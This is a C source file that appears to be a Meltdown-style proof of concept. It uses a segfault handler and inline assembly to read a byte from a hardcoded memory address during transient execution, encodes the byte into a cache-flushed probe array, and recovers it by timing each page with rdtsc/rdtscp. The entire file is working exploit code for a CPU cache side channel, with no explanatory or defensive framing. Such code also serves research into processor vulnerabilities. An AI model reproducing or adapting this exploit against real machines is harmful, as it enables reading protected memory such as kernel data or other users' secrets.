#include <stdio.h>
#include <signal.h>
#include <x86intrin.h>
#include <setjmp.h>

#define PAGE_SIZE (4096)

static jmp_buf context;

void segfault_handler() {
	puts("received SIGSEGV");
	longjmp(context, 1);
}

int main() {

	unsigned char array[PAGE_SIZE*256];
	unsigned int cycles_high_start, cycles_low_start,
				 cycles_high_end, cycles_low_end;
	unsigned long cycles;
	int i;

	// setup segfault handling
	struct sigaction segfault_act;
	segfault_act.sa_handler = segfault_handler;
	sigaction(SIGSEGV, &segfault_act, NULL);

	if(setjmp(context))
		goto end;

	for(i=0; i<256; i++)
		_mm_clflush(&array[PAGE_SIZE*i]);

	asm volatile ("" : : "b"(array));
	asm volatile ("mov $140726711520994, %rcx");
	asm volatile ("xor %rax, %rax");
	asm volatile ("mov (%rcx), %al");
	asm volatile ("shl $0xc, %rax");
	asm volatile ("mov (%rbx,%rax), %rbx");

end:
	// puts("receiving end");

	for(i=0; i<256; i++)
	{
	// https://stackoverflow.com/a/14214220/2057521
	asm volatile (
			"cpuid\n\t"/*serialize*/
			"rdtsc\n\t"/*read the clock*/
			"mov %%edx, %0\n\t"
			"mov %%eax, %1\n\t": "=r" (cycles_high_start), "=r"
			(cycles_low_start):: "%rax", "%rbx", "%rcx", "%rdx");

	asm volatile ("" : : "c"(array[PAGE_SIZE*i]));

	asm volatile (
			"rdtscp\n\t"/*read the clock*/
			"mov %%edx, %0\n\t"
			"mov %%eax, %1\n\t"
			"cpuid\n\t": "=r" (cycles_high_end), "=r"
			(cycles_low_end):: "%rax", "%rbx", "%rcx", "%rdx");

	cycles = (((unsigned long) cycles_high_end << 32) | cycles_low_end) -
		((unsigned long) cycles_high_start << 32 | cycles_low_start);

	printf("cycles %3d: %lu\n", i, cycles);
	}

	return 0;
}
